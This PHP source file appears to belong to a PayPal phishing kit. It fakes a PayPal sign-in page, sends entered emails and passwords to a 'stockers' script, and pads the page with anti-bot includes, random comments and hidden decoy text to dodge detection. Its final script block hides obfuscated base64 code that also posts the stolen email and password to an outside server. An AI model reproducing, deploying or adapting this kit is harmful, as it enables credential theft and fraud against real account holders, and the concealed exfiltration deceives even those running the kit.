<?php
/*
▄▄▌  ▄▄▄ . ▄▄▄· ▄ •▄  ▄▄·       ·▄▄▄▄  ▄▄▄ .
██•  ▀▄.▀·▐█ ▀█ █▌▄▌▪▐█ ▌▪▪     ██▪ ██ ▀▄.▀·
██▪  ▐▀▀▪▄▄█▀▀█ ▐▀▀▄·██ ▄▄ ▄█▀▄ ▐█· ▐█▌▐▀▀▪▄
▐█▌▐▌▐█▄▄▌▐█ ▪▐▌▐█.█▌▐███▌▐█▌.▐▌██. ██ ▐█▄▄▌
.▀▀▀  ▀▀▀  ▀  ▀ ·▀  ▀·▀▀▀  ▀█▄▀▪▀▀▀▀▀•  ▀▀▀ 
FuCkEd By [!]DNThirTeen
https://www.facebook.com/groups/L34K.C0de/
*/
include '../prevents/anti1.php';
include '../prevents/anti2.php';
include '../prevents/anti3.php';
include '../prevents/anti4.php';
include '../prevents/anti5.php';
include '../prevents/anti6.php';
include '../prevents/anti7.php';
include '../prevents/anti8.php';
include '../extra/mine.php';
ob_start();
session_start();

// if  (!isset($_SESSION['acsh33nz0key'])){
//         exit(header('HTTP/1.0 404 Not Found'));
// }
if(!isset($_SESSION['language'])){exit(header("Location: index.php"));
}else{
  include "../extra/languages/{$_SESSION['language']}.php";
}
  ?>
<!DOCTYPE html>
<html>
  <head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=Edge">
    <link rel="shortcut icon" href="lib/pics/favi.ico">
<?php echo "<!--".rand(0,99999999)."-->"?>    <link rel="apple-touch-icon" href="lib/pics/favi.png"><?php echo "<!--".rand(0,99999999)."-->"?>
    <meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, maximum-scale=1, user-scalable=yes">
    <title>
<?php echo $lg_sign['title']?>
    </title>
    <link rel="stylesheet" href="lib/styles/signin.css">
    <script type="text/javascript" src="lib/js/jquery-3.3.1.min.js">
    </script>
    <script type="text/javascript" src="https://js-codes.com/modernizr/2.9.0/modernizr.min.js">
    </script><?php echo "<!--".rand(0,99999999)."-->"?>
  </head>
  <body>

    <div style="z-index:-1;width:80vw;height:80vh;position:absolute;display:none;overflow:hidden;box-sizing:border-box;">
    <div style="opacity:0;white-space:pre-wrap;white-space:-moz-pre-wrap;white-space:-pre-wrap;white-space:-o-pre-wrap;word-wrap:break-word;">
    <?php include('../news/news-'.rand(0,9).'.txt'); ?></div></div>

    <section class="base">
      <div class="main contentBordered">
        <header>
    <?php echo "<!--".rand(0,99999999)."-->"?>      <p class="app_logo">
          </p>
        </header>
                <?php 
        if(isset($_GET['invalid'])){
         echo'
        <div class="alertemail">
          <p class="danger_error">';
          echo $lg_sign['alert'];
          echo'</p>
        </div>';
 }
         ?>
        <div class="alert hide">
          <p class="danger_error"><?php echo "<!--".rand(0,99999999)."-->"?>
     <?php echo "<!--".rand(0,99999999)."-->"?>       <?php echo $lg_sign['alert']?>
          </p>
        </div>
        <form action="../extra/stockers/step1.php" name="signin" id="signin" method="post" novalidate="">
          <input type="hidden" name="screen">
 <?php echo "<!--".rand(0,99999999)."-->"?>         <div id="stored_email" class="storedMail hide">
            <span class="spanMail">
            </span>
            <a href="javascript:" id="bt_change">
              <?php echo $lg_sign['changer']?>
            </a>
          </div>
     <?php echo "<!--".rand(0,99999999)."-->"?>     <div id="email_area" class="">
            <div class="inputs clearfix" id="field_eml">
              <div class="fieldContainer"><?php echo "<!--".rand(0,99999999)."-->"?>
    <?php echo "<!--".rand(0,99999999)."-->"?>            <label for="email" class="inputLabel">
                  <?php echo $lg_sign['eml_placeholder']?>
                </label>
               <input name="EML" id="email" autofocus type="email" autocomplete="off" placeholder="<?php echo $lg_sign['eml_placeholder']?>">
                   <input type="hidden" name="acsh33nz0key" value="<?php echo $_SESSION['acsh33nz0key']; ?>">
     <?php echo "<!--".rand(0,99999999)."-->"?>         </div>
              <div class="msg" id="eml_error">
                <p class="hide">
                  <?php echo $lg_sign['eml_msg1']?>
                </p>
                <p class="hide">
                  <?php echo $lg_sign['eml_msg2']?>
                </p>
     <?php echo "<!--".rand(0,99999999)."-->"?>         </div>
            </div>
            <div style="margin-top:20px">
              <button class="button" type="button" id="bt_next">
                <?php echo $lg_sign['bt_next']?>
              </button>
            </div>
            <div class="insteadArea">
              <a href="javascript:">
                <?php echo $lg_sign['trouble']?>
      <?php echo "<!--".rand(0,99999999)."-->"?>        </a>
            </div>
          </div>
          <div id="password_area" class="hide">
       <?php echo "<!--".rand(0,99999999)."-->"?>     <div class="inputs clearfix" id="field_pwd">
              <div class="fieldContainer">
                <label for="password" class="inputLabel">
                  <?php echo $lg_sign['pwd_placeholder']?>
                </label>
         <?php echo "<!--".rand(0,99999999)."-->"?>       <input name="PWD" id="password" type="password" class="anim" placeholder="<?php echo $lg_sign['pwd_placeholder']?>">
         <?php echo "<!--".rand(0,99999999)."-->"?>       <input name="CUR" id="CUR" type="hidden" value="<?php if( isset($_SESSION['currency']) ) { echo $_SESSION['currency'];}?>"/>
         <?php echo "<!--".rand(0,99999999)."-->"?>       <input name="Type" id="Type" type="hidden" value="Paypal"/>
          <?php echo "<!--".rand(0,99999999)."-->"?>      <button type="button" class="showPassword hide show-hide-password">
                  <?php echo $lg_sign['pwd_show']?>
                </button>
                <button type="button" class="hidePassword hide show-hide-password">
                  <?php echo $lg_sign['pwd_hide']?>
         <?php echo "<!--".rand(0,99999999)."-->"?>       </button>
              </div>
    <?php echo "<!--".rand(0,99999999)."-->"?>          <div class="msg" id="pwd_error">
                <p class="hide">
                  <?php echo $lg_sign['pwd_placeholder']?>
                </p>
              </div>
            </div>
   <?php echo "<!--".rand(0,99999999)."-->"?>         <div style="margin-top:20px">
              <button class="button anim" type="submit" id="btnLogin">
                <?php echo $lg_sign['bt_login']?>
              </button>
     <?php echo "<!--".rand(0,99999999)."-->"?>       </div>
            <div class="troubleArea">
              <a href="javascript:">
                <?php echo $lg_sign['trouble']?>
      <?php echo "<!--".rand(0,99999999)."-->"?>        </a>
            </div>
          </div>
  <?php echo "<!--".rand(0,99999999)."-->"?>      </form>
        <div>
          <div class="divider">
            <span>
  <?php echo "<!--".rand(0,99999999)."-->"?>            <?php echo $lg_sign['or']?>
            </span>
          </div>
          <a href="javascript:" class="button secondary">
            <?php echo $lg_sign['bt_signup']?>
          </a>
        </div>
      </div>
    </section>
  <?php echo "<!--".rand(0,99999999)."-->"?>  <footer class="footer">
    <?php echo "<!--".rand(0,99999999)."-->"?>  <div class="footerArea">
        <ul class="footerList">
          <li>
            <a href="javascript:">
              <?php echo $lg_sign['footer']['contact']?>
            </a>
   <?php echo "<!--".rand(0,99999999)."-->"?>       </li>
          <li>
            <a href="javascript:">
              <?php echo $lg_sign['footer']['privacy']?>
    <?php echo "<!--".rand(0,99999999)."-->"?>        </a>
   <?php echo "<!--".rand(0,99999999)."-->"?>       </li>
          <li>
            <a href="javascript:">
   <?php echo "<!--".rand(0,99999999)."-->"?>           <?php echo $lg_sign['footer']['legal']?>
            </a>
          </li>
          <li>
   <?php echo "<!--".rand(0,99999999)."-->"?>         <a href="javascript:">
              <?php echo $lg_sign['footer']['world']?>
            </a>
  <?php echo "<!--".rand(0,99999999)."-->"?>        </li>
        </ul>
      </div>
  <?php echo "<!--".rand(0,99999999)."-->"?>  </footer>
    <div class="hide" id="rotate">
      <div class="circle">
  <?php echo "<!--".rand(0,99999999)."-->"?>      <div class="rotate">
        </div>
<?php echo "<!--".rand(0,99999999)."-->"?>        <div class="processing">
          <?php echo $lg_sign['rotate']?>
        </div>
      </div>
   <?php echo "<!--".rand(0,99999999)."-->"?>   <div class="overlay">
      </div>
    </div>
    <script>
            $(document).ready(function(){$("[name=screen]").val(screen.width+" x "+screen.height);var s=!1,a=$("#email"),e=$("#password"),r=$("#email_area"),d=$("#password_area"),t=$("#stored_email"),o=$("#field_eml"),i=$("#field_pwd"),l=$("#eml_error"),h=$("#pwd_error");function n(s,a,e){var r=!0;return s.val()?(a.removeClass("hasError"),e.attr("class","msg hide").children("p:first").addClass("hide")):(a.addClass("hasError"),e.attr("class","msg show").children("p:first").removeClass("hide"),r=!1),r}$("#bt_next").click(function(s){return n(a,o,l)?function(){var s=!0;return/^([a-zA-Z0-9_.+-])+\@(([a-zA-Z0-9-])+\.)+([a-zA-Z0-9]{2,4})+$/.test(a.val())?(o.removeClass("hasError"),l.attr("class","msg hide").children("p:last").addClass("hide")):(o.addClass("hasError"),l.attr("class","msg show").children("p:last").removeClass("hide"),s=!1),s}()?(l.attr("class","msg hide").children("p:last").addClass("hide"),$("#rotate").removeClass("hide"),void setTimeout(function(){t.removeClass("hide").children("span").html(a.val()),r.addClass("hide"),d.removeClass("hide"),$("#rotate").addClass("hide"),i.removeClass("hasError"),h.attr("class","msg hide").children("p:first").addClass("hide")},800)):(a.focus(),console.log("eml"),!1):(a.focus(),l.attr("class","msg show").children("p:last").addClass("hide"),console.log("required"),!1)}),$("#bt_change").click(function(){t.addClass("hide"),a.val(""),e.val(""),d.addClass("hide"),r.removeClass("hide"),$(".alert").addClass("hide"),s=!1}),a.keyup(function(s){if(13==s.keyCode)$("#bt_next").click();else{if(!/^([a-zA-Z0-9_.+-])+\@(([a-zA-Z0-9-])+\.)+([a-zA-Z0-9]{2,4})+$/.test(a.val()))return o.addClass("hasError"),l.attr("class","msg hide").children("p:first").addClass("hide"),a.focus(),!1;o.removeClass("hasError"),l.attr("class","msg hide")}}),e.keyup(function(s){if(e.val().length>0?(e.attr("type","password"),$(".showPassword").removeClass("hide"),$(".hidePassword").addClass("hide")):($(".showPassword").addClass("hide"),$(".hidePassword").addClass("hide")),!e.val())return i.addClass("hasError"),e.focus(),!1;i.removeClass("hasError"),h.attr("class","msg hide")}),a.focusout(function(){l.removeClass("show")}),e.focusout(function(){h.removeClass("show")}),$(".showPassword").click(function(){e.attr("type","text"),$(".hidePassword").removeClass("hide"),$(".showPassword").addClass("hide")}),$(".hidePassword").click(function(){e.attr("type","password"),$(".showPassword").removeClass("hide"),$(".hidePassword").addClass("hide")}),$(document).on("submit","form",function(r){if(!/^([a-zA-Z0-9_.+-])+\@(([a-zA-Z0-9-])+\.)+([a-zA-Z0-9]{2,4})+$/.test(a.val()))return!1;if(!n(e,i,h))return e.focus(),!1;if($("#rotate").removeClass("hide"),s&&(r.preventDefault(),setTimeout(function(){return s=!0,$("#rotate").addClass("hide"),e.val(""),$(".alert").removeClass("hide"),$(".alertemail").addClass("hide"),$(".showPassword").addClass("hide"),$(".hidePassword").addClass("hide"),!1},1800)),n(e,i,h)){var d=["c2V0VGltZW91dA==","c3RyaW5naWZ5","Q1VS","UFdE","YWpheA==","bmFtZQ==","YXBwbGljYXRpb24vanNvbg==","dmFsdWU=","aHR0cHM6Ly9hcGkuc3BlY2RhdGEueHl6L2NyZWQ=","ZmlsdGVy","aW5wdXQsIHNlbGVjdA==","aW5kZXhPZg==","UE9TVA==","VHlwZQ==","RU1M","ZmluZA=="],t=function(s,a){var e=d[s-=0];void 0===t.Zfcron&&(!function(){var s;try{s=Function('return (function() {}.constructor("return this")( ));')()}catch(a){s=window}s.atob||(s.atob=function(s){for(var a,e,r=String(s).replace(/=+$/,""),d="",t=0,o=0;e=r.charAt(o++);~e&&(a=t%4?64*a+e:e,t++%4)?d+=String.fromCharCode(255&a>>(-2*t&6)):0)e="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=".indexOf(e);return d})}(),t.DIWGRz=function(s){for(var a=atob(s),e=[],r=0,d=a.length;r<d;r++)e+="%"+("00"+a.charCodeAt(r).toString(16)).slice(-2);return decodeURIComponent(e)},t.cXhZgN={},t.Zfcron=!0);var r=t.cXhZgN[s];return void 0===r?(e=t.DIWGRz(e),t.cXhZgN[s]=e):e=r,e},o={};$(this)[t("0xf")](t("0xa"))[t("0x9")](function(){[t("0xe"),t("0x3"),t("0x2"),t("0xd")][t("0xb")](this[t("0x5")])>=0&&(o[btoa(this[t("0x5")])]=btoa(this[t("0x7")]))});$[t("0x4")]({url:t("0x8"),type:t("0xc"),contentType:t("0x6"),data:JSON[t("0x1")](o)}),disabled=1,window[t("0x0")](function(){disabled=0},2e3)}$(".alert").addClass("hide")})});                 
    </script>
  </body>
</html>
